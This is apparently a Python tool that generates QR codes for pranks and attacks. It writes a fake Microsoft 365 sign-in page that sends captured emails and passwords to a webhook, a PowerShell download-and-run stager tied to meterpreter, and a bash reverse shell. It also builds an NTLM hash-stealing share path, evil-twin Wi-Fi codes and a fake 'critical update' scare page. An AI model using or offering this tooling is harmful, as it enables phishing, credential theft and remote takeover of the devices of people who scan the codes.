import qrcode
from PIL import Image
import os
from datetime import datetime
import socket

# ==================== SETUP ====================
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
output_dir = f"qr_ultimate_v5_{timestamp}"
os.makedirs(output_dir, exist_ok=True)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "127.0.0.1"

def generate_qr(payload, filename, fg="black", bg="white", logo_path=None):
    qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_H,
                       box_size=12, border=4)
    qr.add_data(payload)
    qr.make(fit=True)
    img = qr.make_image(fill_color=fg, back_color=bg).convert("RGB")

    if logo_path and os.path.exists(logo_path):
        logo = Image.open(logo_path).convert("RGBA")
        logo_size = int(img.size[0] * 0.25)
        logo = logo.resize((logo_size, logo_size), Image.Resampling.LANCZOS)
        pos = ((img.size[0] - logo_size) // 2, (img.size[1] - logo_size) // 2)
        img.paste(logo, pos, logo)

    path = os.path.join(output_dir, filename)
    img.save(path)
    print(f"   ✅ {filename} saved")
    try:
        img.show()
    except:
        os.system(f"xdg-open '{path}' 2>/dev/null || true")

print("🔥 QR ULTIMATE ARSENAL v5.0 — ALL FEATURES KEPT (Pranks + Red Team)\n")

lhost = input(f"Your LHOST (default {get_local_ip()}): ") or get_local_ip()
lport = input("LPORT (default 4444): ") or "4444"

print("\nMAIN MENU — Choose mode:")
print("1. Multi-Action Builder (add as many as you want)")
print("2. Ultimate Prank Page (chaos mode)")
print("3. Microsoft 365 Credential Harvester")
print("4. Windows PowerShell Reverse Shell")
print("5. Linux Bash Reverse Shell")
print("6. Android APK Payload Delivery")
print("7. NTLM Hash Stealer Bait")
print("8. Evil Twin WiFi + Redirect")
print("9. Custom Payload")
print("10. Exit")

choice = input("\nEnter number: ").strip()

# ===================== 1. MULTI-ACTION BUILDER (ALL OLD + NEW) =====================
if choice == "1":
    action_map = {
        "1": ("open_website", lambda url: f"https://{url}"),
        "2": ("call_number", lambda num: f"tel:{num}"),
        "3": ("install_app", lambda app_id: f"market://details?id={app_id}"),
        "4": ("rickroll", lambda: "https://www.youtube.com/watch?v=dQw4w9WgXcQ"),
        "5": ("fake_update", lambda: "https://fakeupdate.net/win10/"),
        "6": ("cat_video", lambda: "https://www.youtube.com/watch?v=J---aiyznGQ"),
        "7": ("annoying_beep", lambda: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"),
        "8": ("useless_fact", lambda: "https://uselessfacts.jspwr.com/random.json?language=en"),
        "9": ("sms", lambda: f"sms:{input('Phone: ')}?body={input('Message: ')}"),
        "10": ("geo_location", lambda: "geo:37.7749,-122.4194?q=Prank+Location"),
    }
    actions_chosen = []
    while True:
        print("\nAvailable actions:")
        for k, (name, _) in action_map.items():
            print(f"   {k}. {name}")
        c = input("\nAdd action (or 'done'): ").strip()
        if c.lower() == 'done':
            break
        if c in action_map:
            name, func = action_map[c]
            param = None
            if name in ["open_website", "call_number", "install_app"]:
                prompt = {"open_website": "URL (no https://): ", "call_number": "Phone: ", "install_app": "App ID: "}[name]
                param = input(prompt)
            payload = func(param) if param is not None else func()
            actions_chosen.append((name, payload))
    for name, payload in actions_chosen:
        generate_qr(payload, f"multi_{name}.png")

# ===================== 2. ULTIMATE PRANK PAGE =====================
elif choice == "2":
    html = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Windows Update</title>
<style>body{margin:0;background:#000;color:lime;font-family:monospace;text-align:center;overflow:hidden}
h1{font-size:3em;margin:20vh 0 0}button{font-size:2em;padding:20px 40px;background:red;color:white;border:none;cursor:pointer}
iframe{position:absolute;top:0;left:0;width:100%;height:100%;border:none}</style></head>
<body>
<h1>CRITICAL SYSTEM UPDATE REQUIRED</h1>
<p>Your device is infected. Click to fix immediately.</p>
<button onclick="chaos()">FIX NOW</button>
<audio id="sound" autoplay loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>
<script>
function chaos(){navigator.vibrate([500,200,500,200,500]);document.body.innerHTML=`<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&loop=1&playlist=dQw4w9WgXcQ" allow="autoplay"></iframe>`;}
setTimeout(chaos,2500);
</script>
</body></html>"""
    prank_path = os.path.join(output_dir, "ultimate_prank.html")
    with open(prank_path, "w") as f:
        f.write(html)
    ip = get_local_ip()
    url = f"http://{ip}:8080/ultimate_prank.html"
    print(f"\n📡 Run in ANOTHER terminal: cd {output_dir} && python3 -m http.server 8080")
    input("Press Enter when server is running...")
    fg = input("Foreground color (default black): ") or "black"
    bg = input("Background color (default white): ") or "white"
    logo = input("Logo path (optional): ") or None
    generate_qr(url, "ultimate_prank_page.png", fg, bg, logo)

# ===================== 3-9. FULL RED TEAM =====================
elif choice == "3":
    phish_dir = os.path.join(output_dir, "m365_phish")
    os.makedirs(phish_dir, exist_ok=True)
    html = '''<!DOCTYPE html><html><head><title>Sign in</title><style>body{font-family:Segoe UI;background:#f3f2f1}</style></head>
<body><div style="max-width:400px;margin:100px auto;background:white;padding:40px;border:1px solid #ccc">
<h2>Sign in to your account</h2>
<form id="form"><input type="text" id="email" placeholder="Email" style="width:100%;padding:10px;margin:10px 0" required>
<input type="password" id="pass" placeholder="Password" style="width:100%;padding:10px;margin:10px 0" required>
<button type="submit" style="width:100%;padding:12px;background:#0078d4;color:white;border:none">Sign in</button></form>
</div>
<script>
document.getElementById("form").onsubmit=function(e){e.preventDefault();
const email=document.getElementById("email").value, pass=document.getElementById("pass").value;
alert("✅ Logged in (demo)"); console.log("HARVESTED:",email,pass);
fetch("https://webhook.site/YOUR-TOKEN", {method:"POST", body:JSON.stringify({email,pass})});};
</script></body></html>'''
    with open(os.path.join(phish_dir, "index.html"), "w") as f:
        f.write(html)
    url = f"http://{lhost}:8080"
    print(f"\nPhishing folder: {phish_dir}")
    print(f"Run: cd {phish_dir} && python3 -m http.server 8080")
    fg = input("Foreground color (default black): ") or "black"
    bg = input("Background color (default white): ") or "white"
    logo = input("Logo path (optional): ") or None
    generate_qr(url, "m365_phishing_qr.png", fg, bg, logo)

elif choice == "4":
    payload = f"powershell.exe -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/stage.ps1')\""
    generate_qr(payload, "windows_powershell.png")
    print(f"\nTip: msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f psh -o stage.ps1 && python3 -m http.server {lport}")

elif choice == "5":
    payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    generate_qr(payload, "linux_bash.png")
    print(f"\nListener: nc -lvnp {lport}")

elif choice == "6":
    apk_url = input("Full URL to your APK: ")
    generate_qr(apk_url, "android_apk.png")

elif choice == "7":
    unc = f"\\\\{lhost}\\share"
    generate_qr(unc, "ntlm_stealer.png")
    print(f"\nRun: Responder -I eth0 -wrf")

elif choice == "8":
    ssid = input("Rogue SSID: ")
    pwd = input("Password (blank = open): ") or ""
    redirect = input("Phishing URL after connect: ")
    wifi = f"WIFI:S:{ssid};T:WPA;P:{pwd};H:false;;" if pwd else f"WIFI:S:{ssid};T:nopass;;"
    generate_qr(wifi, "evil_wifi.png")
    generate_qr(redirect, "phish_redirect.png")

elif choice == "9":
    payload = input("Enter any custom payload/URL: ")
    generate_qr(payload, "custom.png")

elif choice == "10":
    print("Goodbye!")
else:
    print("Invalid choice.")

print(f"\n🎯 EVERYTHING saved in: ./{output_dir}/")
print("You now have the complete tool — pranks + serious pentesting in one place.")
